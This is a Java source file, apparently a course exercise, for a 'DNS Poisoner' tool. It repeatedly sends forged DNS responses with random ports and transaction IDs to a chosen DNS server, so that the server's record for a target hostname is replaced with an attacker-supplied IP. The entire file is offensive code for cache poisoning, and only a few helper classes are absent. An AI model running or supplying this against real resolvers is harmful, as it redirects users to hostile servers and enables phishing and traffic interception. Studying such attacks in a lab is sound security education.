
package main;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Random;
import java.util.StringTokenizer;
import java.lang.Math;
/*
 * DNS Poisoner
 * Jacob Saunders
 * This program will attempt to poison a DNS server. It does this by
 *  sending forged DNS responses to it on random ports.
 * It will keep running indefinitely, you have to use dig or other
 * such programs to launch the query to let the poisoning go off and
 * check for success.
 * Parameters: dnsServer hostname poisonIP
 * dnsServer: IP address[:port] of the DNS server to poison
 * hostname: URL to hijack
 * poisonIP: IP address to inject as the poisoning attempt.
 */

public class Main {

    /*
     * This method calls the various other functions to accomplish the poisoning
     * after handling the command line arguments.
     */
    public static void main(String[] args) {
        System.out.println("DNS Poisoner");
        System.out.println("Trying to poision the DNS");
        
        if (args.length != 3)
        {
            System.out.println("Invalid quantity of arguments.");
            System.out.println
            ("dnsServer: IP address of the DNS server to poison\n"
                    + "hostname: URL to hijack\n"
                    + "poisonIP: IP address to inject as the poisoning attempt.\n");
            System.exit(-1);
        }
       
        String dnsAddressString = args[0];
        String hostname = args[1];
        String poisonIPstring = args[2];
        System.out.println("DNS Relay Server Address:"+dnsAddressString);
        System.out.println("Host Name is:"+hostname);
        System.out.println("Poisioning with:"+poisonIPstring);
        System.out.println("Press Ctrl+C when you want to stop");
       
        //Get the byte representation of the IP addresses.
        byte[] dnsAddress = ip4StringToByte(dnsAddressString);
        byte[] poisonIP = ip4StringToByte(poisonIPstring);
        Random ranport=new Random();
        Random rantrans=new Random();
       
        //Spam the poisoned DNS replies until reply.
       
        while (true)
        {
            //Set port and ID distribution here.
            int destPort = ranport.nextInt(65534)+1;
            int transactionID = rantrans.nextInt(65535);
           // System.out.println("STUBBED PORT AND ID - IMPLEMENT!");
            //Otherwise, your code is essentially doing this: http://xkcd.com/221/
           
            try {
                launchPoisonPacket(dnsAddress, poisonIP, hostname, destPort,
                        transactionID);
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }
   
    /*
     * This method converts an IPv4 address from a string representation
     * to a byte array.
     * ipAddress: The string representation of an IPv4 address.
     */
    public static byte[] ip4StringToByte(String ipAddress)
    {       
        //Parse IP address.
        InetAddress ip = null;
        try {
            ip = InetAddress.getByName(ipAddress);
        } catch (UnknownHostException e) {
            System.out.println("Unknown Host Error: " + e.getMessage());
            e.printStackTrace();
            System.exit(-1);
        }
       
        byte[] ipByte = ip.getAddress();
       
        return ipByte;
    }
   
    public static void launchPoisonPacket(byte[] dnsAddress,
            byte[] poisonIP, String hostname,
            int destinationPort, int transactionID) throws Exception
    {
        //Get a record to add to the packet.
        byte[] packet = new byte[1024];
       
        //System.out.println("STUBBED POISON PACKET GENERATION - IMPLEMENT!");
       System.out.println("Trying");
        //Open a socket to send it on.
        DatagramSocket socket = null;
        try {
            socket = new DatagramSocket();
        } catch (SocketException e) {
            // TODO Auto-generated catch block
            System.out.println("Failed to grab socket for port.");
            System.out.println(e.getMessage());
            return;
        } catch (IllegalArgumentException e) {
            System.out.println("Port out of range");
            System.out.println(e.getMessage());
        }
       
        //Craft a datagram to send.
        HostRecord hostRecord = new HostRecord(hostname);
        try {
            hostRecord.addIpAddress(new IPAddress(poisonIP));
        } catch (Exception e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        byte reply[] = DnsResponse.constructPacket(hostRecord, transactionID);
        DatagramPacket dPacket = new DatagramPacket(reply, reply.length);
        try {               
            dPacket.setAddress(InetAddress.getByAddress(dnsAddress));
            dPacket.setPort(destinationPort);
        } catch (UnknownHostException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            socket.close();
            return;
        }
       
        //Send it.
        try {
            socket.send(dPacket);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            socket.close();
            return;
        }
       
        socket.close();
       
    }

}